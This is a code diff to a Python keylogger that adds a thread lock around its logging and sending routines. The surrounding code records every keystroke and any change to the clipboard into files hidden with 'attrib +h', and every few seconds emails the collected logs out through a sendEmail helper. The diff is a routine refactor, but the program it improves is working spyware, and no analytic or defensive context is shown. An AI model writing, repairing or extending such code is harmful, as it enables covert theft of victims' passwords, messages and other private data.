@@ -10,13 +10,11 @@ from emailFunctionality import sendEmail
 from encryption import encryptContents 
 
 ThreadRunning = True
+file_lock = threading.Lock()
 
 
 log_file = "logs.txt"
 clipBoard_file = "clipBoardLogs.txt"
-
-
-
 
 def unhide():
     if os.path.exists(log_file):
@@ -32,10 +30,10 @@ def hide():
     if os.path.exists(clipBoard_file):
         os.system(f'attrib +h "{clipBoard_file}"')
 
+
 unhide()
 with open(log_file, "w") and open(clipBoard_file, "w"):
     pass
-
 hide()
 
 
@@ -47,10 +45,11 @@ def on_press(key):
         return False  
     
     keyPressed = returnKeyType(key)
-    unhide()
-    with open(log_file, "a") as keyLogs:
-        keyLogs.write(parseOutput(keyPressed))
-    hide()
+    with file_lock:
+        unhide()
+        with open(log_file, "a") as keyLogs:
+            keyLogs.write(parseOutput(keyPressed))
+        hide()
 
 def returnKeyType(key):
     try:
@@ -73,22 +72,24 @@ def checkClipBoard():
         currContent = pyperclip.paste()
         if currContent != prevContent:
             prevContent = currContent
-            unhide()
+            with file_lock:
+                unhide()
 
-            with open(clipBoard_file, "a") as clipBoardKeyLogs:
-                clipBoardKeyLogs.write(parseOutput(prevContent))
+                with open(clipBoard_file, "a") as clipBoardKeyLogs:
+                    clipBoardKeyLogs.write(parseOutput(prevContent))
 
-            hide()
+                hide()
         time.sleep(1)
     
 
 def sendToEmail():
 
     while ThreadRunning:
-        unhide()
-        sendEmail()
-        hide()
-        time.sleep(4)
+        with file_lock:
+            unhide()
+            sendEmail()
+            hide()
+            time.sleep(4)
 
     return
 
